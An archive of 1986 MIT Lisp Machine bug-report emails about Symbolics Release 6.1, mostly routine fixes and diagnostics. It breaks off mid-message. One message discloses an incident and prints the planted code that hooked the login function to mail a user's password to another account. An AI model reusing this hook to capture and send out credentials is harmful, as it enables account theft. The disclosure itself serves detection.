    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    While running Release 6.1:

    When trying to make an entry in an EQL hash table for a key that is a character
    object, SXHASH blows out saying that the argument to %FIXNUM should be a single
    precision flonum.  E.g., (setf (gethash #\A x) 3), where x is an EQL hash table.
    While characters do seem to work with EQ hash tables, I'd prefer not to use one
    since characters are not guaranteed to be EQ in Common Lisp.

Somebody used %fixnum when they should have used %pointer.  Try the
below, which is the Release 6.1 version (I think), modified
appropriately.

;This always returns a positive fixnum.  The order of COND clauses is carefully
;chosen to make the most common and important cases fast.  There is duplicated
;code in this function for the same reason.  Two things with the same printed
;representation will get the same sxhash, even in different system incarnations.
;Nothing is guaranteed about the relation between sxhash of a list and sxhash
;of subparts of that list; this is exploited to bum a little extra speed.
(DEFUN SXHASH (X)
  (COND ((SYMBOLP X) (SXHASH-STRING (GET-PNAME X)))
	;; CHAR-STRINGP must come before STRINGP (in Rel 6) because (STRINGP cl-string) => T
	((CHAR-STRINGP X) (SXHASH-CHAR-STRING X))
	((STRINGP X) (SXHASH-STRING X))
	((FIXNUMP X) (NON-NEGATIVE-FIXNUM X))
	((LISTP X)		;Rotate car by 11. and cdr by 7, but do it efficiently
	 (DO ((ROT 4) (HASH 0) Y)
	     ((ATOM X)
	      (OR (NULL X) (SETQ HASH (LOGXOR (ROT (SXHASH X) (- ROT 4)) HASH)))
	      (NON-NEGATIVE-FIXNUM HASH))
	   (SETQ Y (CAR X) X (CDR X))
	   (OR (< (SETQ ROT (+ ROT 7)) 32.) (SETQ ROT (- ROT 32.)))
	   (SETQ HASH (LOGXOR (ROT (COND ((SYMBOLP Y) (SXHASH-STRING (GET-PNAME Y)))
					 ((STRINGP Y) (SXHASH-STRING Y))
					 ((TYPEP Y ':FIXNUM) Y)
					 (T (SXHASH Y)))
				   ROT)
			      HASH))))
	((FIXP X) (LOGXOR (LDB 3701 X) (LDB 0037 X)))	;Bignum
	((SINGLE-FLOAT-P X)
	 (NON-NEGATIVE-FIXNUM (%FIXNUM X)))
	((DOUBLE-FLOAT-P X)
	 (NON-NEGATIVE-FIXNUM (LOGXOR (%P-CONTENTS-OFFSET X 1) (%P-CONTENTS-OFFSET X 2))))
	((RATIONALP X) (LOGXOR (SXHASH (RATIONAL-NUMERATOR X))
			       (SXHASH (RATIONAL-DENOMINATOR X))))
	((CHARACTERP X) (NON-NEGATIVE-FIXNUM (%pointer X)))
	((COMPLEXP X) (LOGXOR (SXHASH (REALPART X)) (SXHASH (IMAGPART X))))
	(T 0)))

28-Apr-86 15:28:36-EDT,1930;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 14:19-EDT
Received: by EDDIE (5.31/4.7) id AA26140; Mon, 28 Apr 86 14:15:13 EDT
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA26536; Mon, 28 Apr 86 14:19:17 EDT
Date: Mon, 28 Apr 86 14:16 EDT
From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>
Subject: Circular defflavor gets error
To: BUG-LISPM@MEDIA-LAB.MIT.EDU
Message-Id: <860428141643.1.JRD@XEVIOUS.ARPA>

In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.1,
Experimental PROSE 1.0, Japanese 24.1, Versatec 9.0, Spire 17.2,
Experimental SYLPAR 1.0, DICTIONARY 1.0, Experimental SPELL 1.0,
microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), Bug Report Recipient, on Xevious:

I tried to evaluate (defflavor foo () (foo))

>>Trap: The first argument given to the AP-1 instruction, NIL, was not an array.
While in the function SI:FLAVOR-INVALIDATE-INIT-INFO  SI:FLAVOR-INVALIDATE-INIT-INFO  SI:DEFFLAVOR1

SI:FLAVOR-INVALIDATE-INIT-INFO:  (P.C. = 3)
   Arg 0 (SI:FL): NIL

SI:FLAVOR-INVALIDATE-INIT-INFO:  (P.C. = 20)
   Arg 0 (SI:FL): #<FLAVOR FOO 123623374>

SI:DEFFLAVOR1:  (P.C. = 2065)
   Arg 0 (SI:FLAVOR-NAME): FOO
   Arg 1 (SYS:INSTANCE-VARIABLES): NIL
   Arg 2 (SI:COMPONENT-FLAVORS): (FOO)
   Arg 3 (SI:OPTIONS): NIL

SI:*EVAL:  (P.C. = 401)
   Arg 0 (SI:FORM): (SI:DEFFLAVOR1 (QUOTE FOO) (QUOTE NIL) (QUOTE (FOO)) (QUOTE NIL))
   Local 0 (SI:FORM): NIL
   Arg 1 (SI:ENV): NIL
   --Defaulted args:--
   Arg 2 (SI:HOOK): NIL



28-Apr-86 16:51:02-EDT,1337;000000000000
Received: from REAGAN.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 16:50-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-REAGAN.ARPA via INTERNET with SMTP id 30308; 28 Apr 86 16:12:26-EDT
Received: from PEACE.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11818; Mon 28-Apr-86 16:07:51 EDT
Date: Mon, 28 Apr 86 16:12 EDT
From: Charles Hornig <Hornig@SCRC-RIVERSIDE.ARPA>
Subject: Another bug in Common Lisp GETHASH
To: Ken Traub <KT@XX.LCS.MIT.EDU>, bug-lispm@OZ.AI.MIT.EDU
In-Reply-To: <12202435864.55.KT@XX.LCS.MIT.EDU>
Message-ID: <860428161217.5.HORNIG@PEACE.SCRC.Symbolics.COM>

    Date: Mon 28 Apr 86 10:22:10-EDT
    From: Ken Traub <KT@XX.LCS.MIT.EDU>

    While running Release 6.1:

    When trying to make an entry in an EQL hash table for a key that is a character
    object, SXHASH blows out saying that the argument to %FIXNUM should be a single
    precision flonum.  E.g., (setf (gethash #\A x) 3), where x is an EQL hash table.
    While characters do seem to work with EQ hash tables, I'd prefer not to use one
    since characters are not guaranteed to be EQ in Common Lisp.

					    -- Ken
    -------

Thank you for this report.  The problem you describe has been fixed.
The fix wil be distributed in a future release.

28-Apr-86 17:03:53-EDT,1067;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 17:03-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM ([192.10.41.223]) by MIT-ZERMATT.ARPA via INTERNET with SMTP id 35048; 28 Apr 86 16:55:13-EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 11865; Mon 28-Apr-86 16:51:29 EDT
Date: Mon, 28 Apr 86 16:50 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
To: Soley@MIT-MC.ARPA, DCP@SCRC-STONY-BROOK.ARPA,
    BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860428154300.5.SOLEY@MIT-CHERRY.ARPA>
Message-ID: <860428165027.2.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Mon, 28 Apr 86 15:43 EDT
    From: Soley@MIT-MC.ARPA

    And here's (TCP::PRINT-RECENT-TCP-HEADERS) from NEWTOWNE (the server):

    TCP::PRINT-RECENT-TCP-HEADERS: Command not found.

    (NEWT is a Unix 4.2bsd Vax . . . What a snob, he thinks all computers
    are 3600's . . .)

(Oh, if I had known that, I would have said "Unix is probably violating
protocol someplace.  So what else is new?")

28-Apr-86 17:21:59-EDT,9150;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 28 Apr 86 17:15-EDT
Received: from MIT-LIVE-OAK.ARPA by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 35042; Mon 28-Apr-86 15:43:39-EDT
Received: from MIT-CHERRY.ARPA by MIT-LIVE-OAK.ARPA via CHAOS with CHAOS-MAIL id 911; Mon 28-Apr-86 15:43:06-EDT
Date: Mon, 28 Apr 86 15:43 EDT
From: Soley@MIT-MC.ARPA
To: DCP@SCRC-STONY-BROOK.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
In-Reply-To: <860428121408.2.DCP@FIREBIRD.SCRC.Symbolics.COM>
Message-ID: <860428154300.5.SOLEY@MIT-CHERRY.ARPA>

    Date: Mon, 28 Apr 86 12:14 EDT
    From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
    To: Soley@MIT-MC.ARPA, BUG-LISPM@MIT-ZERMATT.ARPA
    In-Reply-To: <860428100826.2.SOLEY@MIT-CHERRY.ARPA>
    Message-ID: <860428121408.2.DCP@FIREBIRD.SCRC.Symbolics.COM>

	Date: Mon, 28 Apr 86 10:08 EDT
	From: Soley@MIT-MC.ARPA

	In Symbolics 3670 Release 6.1, IP-TCP 29.13, Illustrate 4.0,
	6-1-Patches 1.13, microcode TMC5-IO4-MIC 336, FEP 22, Tangleworld XIII, on Project Tanglewood Cherry:

	Connection crashes in the same place every time I try to save this ZMail
	buffer.

    What does (tcp::print-recent-tcp-headers) say, both on your machine and
    on NEWTOWNE?  (You'll have to be pretty quick to get it on Newtowne if
    it is a heavily used server.)

Needless to say, now that I've sent bug mail, it works now.
Nonetheless, here's (TCP::PRINT-RECENT-TCP-HEADERS) from CHERRY (the user):

Current internal time is 0098.222086 
DIR UAPRSF from-from->to-to Sequence (Acknowledge) Window (Urgent) Recorded
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023507. Ack=5839367.  Len=0 Window=19759.  Rcrded: 0049.187913
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839321. Ack=2139023507.  Len=46 Window=2048.  Rcrded: 0049.100491
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839320. Ack=2139023507.  Len=1 Window=2048.  Rcrded: 0049.090365
In   A     18.10.0.75-95->18.48.0.192-1103 Seq=5839320. Ack=2139023507.  Len=0 Window=2048.  Rcrded: 0049.066834
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023506. Ack=5839320.  Len=1 Window=19806.  Rcrded: 0048.855731
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023506. Ack=5839320.  Len=0 Window=19806.  Rcrded: 0048.713595
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839319. Ack=2139023506.  Len=1 Window=2048.  Rcrded: 0048.621405
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023505. Ack=5839319.  Len=1 Window=19807.  Rcrded: 0048.590541
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023505. Ack=5839319.  Len=0 Window=19807.  Rcrded: 0048.155982
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839318. Ack=2139023505.  Len=1 Window=2048.  Rcrded: 0048.060090
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023504. Ack=5839318.  Len=1 Window=19808.  Rcrded: 0048.029715
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023504. Ack=5839318.  Len=0 Window=19808.  Rcrded: 0047.913321
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839317. Ack=2139023504.  Len=1 Window=2048.  Rcrded: 0047.892506
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023503. Ack=5839317.  Len=1 Window=19809.  Rcrded: 0047.861552
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839316. Ack=2139023503.  Len=1 Window=2048.  Rcrded: 0047.808626
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023502. Ack=5839316.  Len=1 Window=19810.  Rcrded: 0047.778178
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023502. Ack=5839316.  Len=0 Window=19810.  Rcrded: 0047.764918
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839315. Ack=2139023502.  Len=1 Window=2048.  Rcrded: 0047.676222
In   A     18.10.0.75-95->18.48.0.192-1103 Seq=5839315. Ack=2139023502.  Len=0 Window=2048.  Rcrded: 0047.667152
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023501. Ack=5839315.  Len=1 Window=19811.  Rcrded: 0047.645610
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023501. Ack=5839315.  Len=0 Window=19811.  Rcrded: 0047.585215
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839314. Ack=2139023501.  Len=1 Window=2048.  Rcrded: 0047.569928
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023500. Ack=5839314.  Len=1 Window=19812.  Rcrded: 0047.539562
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839313. Ack=2139023500.  Len=1 Window=2048.  Rcrded: 0047.481600
In   A     18.10.0.75-95->18.48.0.192-1103 Seq=5839313. Ack=2139023500.  Len=0 Window=2047.  Rcrded: 0047.467442
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023499. Ack=5839313.  Len=1 Window=19813.  Rcrded: 0047.450905
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023499. Ack=5839313.  Len=0 Window=19813.  Rcrded: 0047.171522
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839312. Ack=2139023499.  Len=1 Window=2048.  Rcrded: 0047.071025
In   A     18.10.0.75-95->18.48.0.192-1103 Seq=5839312. Ack=2139023499.  Len=0 Window=2048.  Rcrded: 0047.067653
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023498. Ack=5839312.  Len=1 Window=19814.  Rcrded: 0047.037207
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023498. Ack=5839312.  Len=0 Window=19814.  Rcrded: 0046.977709
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839311. Ack=2139023498.  Len=1 Window=2048.  Rcrded: 0046.940084
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023497. Ack=5839311.  Len=1 Window=19815.  Rcrded: 0046.909608
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839310. Ack=2139023497.  Len=1 Window=2048.  Rcrded: 0046.889840
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023496. Ack=5839310.  Len=1 Window=19816.  Rcrded: 0046.859600
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023496. Ack=5839310.  Len=0 Window=19816.  Rcrded: 0046.763309
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839309. Ack=2139023496.  Len=1 Window=2048.  Rcrded: 0046.675144
In   A     18.10.0.75-95->18.48.0.192-1103 Seq=5839309. Ack=2139023496.  Len=0 Window=2048.  Rcrded: 0046.666192
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023495. Ack=5839309.  Len=1 Window=19817.  Rcrded: 0046.640200
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023495. Ack=5839309.  Len=0 Window=19817.  Rcrded: 0046.533717
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839308. Ack=2139023495.  Len=1 Window=2048.  Rcrded: 0046.439653
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023494. Ack=5839308.  Len=1 Window=19818.  Rcrded: 0046.407124
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839307. Ack=2139023494.  Len=1 Window=2048.  Rcrded: 0046.332138
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023493. Ack=5839307.  Len=1 Window=19819.  Rcrded: 0046.301778
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023493. Ack=5839307.  Len=0 Window=19819.  Rcrded: 0046.274565
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839306. Ack=2139023493.  Len=1 Window=2048.  Rcrded: 0046.174801
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023492. Ack=5839306.  Len=1 Window=19820.  Rcrded: 0046.143662
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023492. Ack=5839306.  Len=0 Window=19820.  Rcrded: 0045.882108
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839305. Ack=2139023492.  Len=1 Window=2048.  Rcrded: 0045.781428
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023491. Ack=5839305.  Len=1 Window=19821.  Rcrded: 0045.750375
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023491. Ack=5839305.  Len=0 Window=19821.  Rcrded: 0045.370477
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839293. Ack=2139023491.  Len=12 Window=2048.  Rcrded: 0045.327633
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839292. Ack=2139023491.  Len=1 Window=2048.  Rcrded: 0045.274236
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023491. Ack=5839292.  Len=0 Window=19834.  Rcrded: 0045.158679
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839288. Ack=2139023491.  Len=4 Window=2048.  Rcrded: 0045.055206
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023490. Ack=5839288.  Len=1 Window=19838.  Rcrded: 0044.952839
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839287. Ack=2139023490.  Len=1 Window=2048.  Rcrded: 0044.888612
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023489. Ack=5839287.  Len=1 Window=19839.  Rcrded: 0044.857813
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023489. Ack=5839287.  Len=0 Window=19839.  Rcrded: 0044.803851
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839286. Ack=2139023489.  Len=1 Window=2048.  Rcrded: 0044.800098
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023488. Ack=5839286.  Len=1 Window=19840.  Rcrded: 0044.772467
In   AP    18.10.0.75-95->18.48.0.192-1103 Seq=5839285. Ack=2139023488.  Len=1 Window=2048.  Rcrded: 0044.705901
Out  AP    18.48.0.192-1103->18.10.0.75-95 Seq=2139023487. Ack=5839285.  Len=1 Window=19841.  Rcrded: 0044.675435
Out  A     18.48.0.192-1103->18.10.0.75-95 Seq=2139023487. Ack=5839285.  Len=0 Window=19841.  Rcrded: 0044.619645

And here's (TCP::PRINT-RECENT-TCP-HEADERS) from NEWTOWNE (the server):

TCP::PRINT-RECENT-TCP-HEADERS: Command not found.

(NEWT is a Unix 4.2bsd Vax . . . What a snob, he thinks all computers
are 3600's . . .)

	-- Richard
29-Apr-86 18:32:38-EDT,2691;000000000000
Received: from SPACE-CADET.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 29 Apr 86 18:32-EDT
Date: Tue, 29 Apr 86 18:32 EDT
From: Patrick A. O'Donnell <PAO@EECS.MIT.EDU>
Subject: Compromised passwords
To: psr@OZ.AI.MIT.EDU, drm@MIT-XX.ARPA
cc: info-lispm@OZ.AI.MIT.EDU
Message-ID: <860429183208.9.PAO@SPACE-CADET.AI.MIT.EDU>

It appears that someone has hacked Illustrate such that it
has been collecting passwords from at least one user.  The creation date
on oak:>illustrate>ill-font.bin is 08/06/85.

------------------------------

-> si:advised-functions

(CHAOS:CHAOS-SCREEN-SPY-SERVER-FUNCTION-INTERNAL FS:GET-USER-ID-AND-PASSWORD)

-> (grindef FS:GET-USER-ID-AND-PASSWORD)

(ADVISE FS:GET-USER-ID-AND-PASSWORD
        :AFTER
        :PATCH-242.356
        0.
        (PROCESS-RUN-FUNCTION "Notify" (FUNCTION SI:SEND-IT) VALUES))
(DEFF FS:GET-USER-ID-AND-PASSWORD
      '#<DTP-COMPILED-FUNCTION FS:GET-USER-ID-AND-PASSWORD 11532517>)
*

-> (grindef si:send-it)

(DEFUN SI:SEND-IT (VALUES)
    (IGNORE-ERRORS (WHEN (AND (STRING-EQUAL (FIRST VALUES) "PSR")
                              (SECOND VALUES))
                         (ZWEI:SEND-MESSAGE-STRING "DRM@XX"
                                                   (FORMAT NIL
                                                           "~A = ~A"
                                                           (FIRST VALUES)
                                                           (SECOND VALUES))))))
*

-> (describe 'si:send-it)

SI:SEND-IT is the function (SI:DIGESTED-LAMBDA (LAMBDA ** **) (SI:SEND-IT) ...): (VALUES)
    (SI:DIGESTED-LAMBDA (LAMBDA (VALUES) (IGNORE-ERRORS (WHEN (AND ** **) (ZWEI:SEND-MESSAGE-STRING "DRM@XX" **)))) (SI:SEND-IT) 2049. 262401. NIL (VALUES) NIL (IGNORE-ERRORS (WHEN (AND (STRING-EQUAL ** "PSR") (SECOND VALUES)) (ZWEI:SEND-MESSAGE-STRING "DRM@XX" (FORMAT NIL "~A = ~A" ** **))))) is a list
    
SI:SEND-IT is in the SYSTEM-INTERNALS package.
SI:SEND-IT has property :SOURCE-FILE-NAME: #<LOGICAL-PATHNAME "ILL: CODE; ILL-FONT">
    #<LOGICAL-PATHNAME "ILL: CODE; ILL-FONT">, an object of flavor FS:LOGICAL-PATHNAME,
     has instance variable values:
     FS:TRANSLATED-PATHNAME:   #<LMFS-PATHNAME "OAK:>illustrate>ill-font">
     FS:TRANSLATION-TICK:      5.
     FS:HOST:                  #<LOGICAL-HOST ILL>
     FS:DEVICE:                :UNSPECIFIC
     FS:DIRECTORY:             ("CODE")
     FS:NAME:                  "ILL-FONT"
     FS:TYPE:                  NIL
     FS:VERSION:               NIL
     SI:PROPERTY-LIST:         NIL
     FS:STRING-FOR-PRINTING:   "ILL: CODE; ILL-FONT"
    
SI:SEND-IT

------------------------------
30-Apr-86 11:11:43-EDT,1976;000000000000
Received: from EDDIE.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 30 Apr 86 11:11-EDT
Received: by EDDIE (5.31/4.7) id AA25881; Wed, 30 Apr 86 10:39:43 EDT
Received: by MEDIA-LAB.MIT.EDU (5.31/4.8)  id AA17596; Wed, 30 Apr 86 10:43:45 EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 30 Apr 86 10:08:26 EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 13202; Wed 30-Apr-86 10:04:32 EDT
Date: Wed, 30 Apr 86 10:03 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: Circular defflavor gets error
To: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>, BUG-LISPM@MEDIA-LAB.MIT.EDU
In-Reply-To: <860428141643.1.JRD@XEVIOUS.ARPA>
Message-Id: <860430100331.6.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Mon, 28 Apr 86 14:16 EDT
    From: James R. Davis <jrd@MEDIA-LAB.MIT.EDU>

    In Symbolics 3600 Release 6.1, Netrender (DS) 1.12, COLOR 135.55,
    COLOR-DEMO 68.10, Paint (DS) 8.0, Menu 6.1,
    Experimental Color Editor 5.1, IMAGES 56.25, COLOR-EXTENSIONS 4.6,
    BS-FONTS 4.2, Tablet (DS) 3.7, Live Window 272.0, Dynamics (DS) 7.15,
    Render (DS) 15.6, COLOR-PALETTE 2.1, Geometry (DS) 7.40, Demo-Band 63.0,
    Experimental TMC 3d Image Toolkit 71.0, IP-TCP 29.13, DECTALK 1.1,
    Experimental PROSE 1.0, Japanese 24.1, Versatec 9.0, Spire 17.2,
    Experimental SYLPAR 1.0, DICTIONARY 1.0, Experimental SPELL 1.0,
    microcode TMC5-COLOR-MIC 336, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(3), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), Bug Report Recipient, on Xevious:

    I tried to evaluate (defflavor foo () (foo))

The Release 7 reimplementation of flavors will tell you
	FOO is specified as a component of itself, which is illegal.

    >>Trap: The first argument given to the AP-1 instruction, NIL, was not an array.
    While in the function SI:FLAVOR-INVALIDATE-INIT-INFO  SI:FLAVOR-INVALIDATE-INIT-INFO  SI:DEFFLAVOR1


30-Apr-86 15:21:21-EDT,1802;000000000000
Received: from LENNON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 30 Apr 86 15:21-EDT
Date: Wed, 30 Apr 86 15:22 EDT
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: attribute list package creation loses
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860430152209.1.JAR@LENNON.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.7, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine John Lennon:


The following are the first two lines in one of my files:

    ;;; -*- Mode: Lisp; Syntax: Common-lisp; Package: (CLSCHEME :USE (PSEUDOSCHEME LISP)) -*-
    (in-package 'clscheme :use '(pseudoscheme lisp))

When I do Find File on this file, the CLSCHEME package doesn't exist,
but the PSEUDOSCHEME package does exist.  The Find File command
complains that the CLSCHEME package fails the validation function.  In
fact, the CLSCHEME package that ZWEI created doesn't :use either the
LISP package or the ZL or CL or SCL packages.

The documentation states that unless there is some ambiguity with other
syntaxes, the arguments are passed on to MAKE-PACKAGE.  Clearly this
didn't happen.  There is a bug somewhere.   (I don't think there is an
ambiguity in this case; am I wrong?  If so, why didn't I get a different
error?)

Regardless of what the attribute list says, the editor should find
IN-PACKAGE, SHADOW, and EXPORT forms in the file and deal with them.
Otherwise it is very difficult to edit Common Lisp programs without
using Symbolics Lisp features like Symbolics Lisp package declarations.
That would seem to defeat the point of supporting Common Lisp in the
first place.

Jonathan
30-Apr-86 15:33:04-EDT,806;000000000000
Received: from LENNON.AI.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 30 Apr 86 15:32-EDT
Date: Wed, 30 Apr 86 15:34 EDT
From: Jonathan A Rees <JAR@MIT-MC.ARPA>
Subject: (declare (ignore ...))
To: BUG-LISPM@OZ.AI.MIT.EDU
Message-ID: <860430153415.2.JAR@LENNON.AI.MIT.EDU>

In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
AISite 14.7, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
FEP0:>v127-info.flod(2), on Lisp Machine John Lennon:


;-*- Package: COMMON-LISP-USER; Syntax: Common-lisp; Mode: LISP -*-

(defun foo (x)
  (declare (ignore x))
  1)


When I compile this I get a compiler warning saying that the variable X
wasn't used.  I shouldn't.

Jonathan
30-Apr-86 22:39:43-EDT,1378;000000000000
Received: from MC.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 30 Apr 86 22:39-EDT
Received: from SAPSUCKER.SCRC.Symbolics.COM by MC.LCS.MIT.EDU 30 Apr 86 22:22:38 EDT
Received: from FIREBIRD.SCRC.Symbolics.COM by SAPSUCKER.SCRC.Symbolics.COM via CHAOS with CHAOS-MAIL id 13657; Wed 30-Apr-86 22:18:48 EDT
Date: Wed, 30 Apr 86 22:16 EDT
From: David C. Plummer <DCP@SCRC-QUABBIN.ARPA>
Subject: (declare (ignore ...))
To: Jonathan A Rees <JAR@MIT-MC.ARPA>, BUG-LISPM@OZ.AI.MIT.EDU
In-Reply-To: <860430153415.2.JAR@LENNON.AI.MIT.EDU>
Message-ID: <860430221650.8.DCP@FIREBIRD.SCRC.Symbolics.COM>

    Date: Wed, 30 Apr 86 15:34 EDT
    From: Jonathan A Rees <JAR@MIT-MC.ARPA>

    In Symbolics 3600 Release 6.1, IP-TCP 29.13, 6-1-Patches 1.13,
    AISite 14.7, Macsyma 318.23, FORTRAN 49.4, PASCAL 31.0,
    microcode TMC5-COL-MIC 353, FEP 127, FEP0:>v127-lisp.flod(2),
    FEP0:>v127-loaders.flod(2), FEP0:>v127-debug.flod(1),
    FEP0:>v127-info.flod(2), on Lisp Machine John Lennon:


    ;-*- Package: COMMON-LISP-USER; Syntax: Common-lisp; Mode: LISP -*-

    (defun foo (x)
      (declare (ignore x))
      1)


    When I compile this I get a compiler warning saying that the variable X
    wasn't used.  I shouldn't.

I think you've reported this before.  I thought we answered it before:
(declare (ignore ...)) works correctly in Release 7.

 1-May-86 11:54:14-EDT,3060;000000000000
Received: from ZERMATT.LCS.MIT.EDU by OZ.AI.MIT.EDU via Chaosnet; 1 May 86 11:53-EDT
Received: from KILLINGTON.LCS.MIT.EDU by MIT-ZERMATT.ARPA via CHAOS with CHAOS-MAIL id 35420; Thu 1-May-86 11:54:12-EDT
Date: Thu, 1 May 86 11:53 EDT
From: Robert Scheifler <RWS@MIT-ZERMATT.ARPA>
Subject: faster array copying
To: BUG-LISPM@MIT-ZERMATT.ARPA
Message-ID: <860501115320.1.RWS@KILLINGTON.LCS.MIT.EDU>

In Symbolics 3640 Release 6.1, IP-TCP 29.13, Macsyma 318.12, PASCAL 31.0,
FORTRAN 49.4, Japanese 24.1, 6-1-Patches 1.13, MLSite 13.2,
Experimental DVI 1.1, Experimental Schema 115.0, Experimental XML 2.4,
Experimental X-Window-System 3.0, microcode TMC5-IO4-ST506-MIC 336,
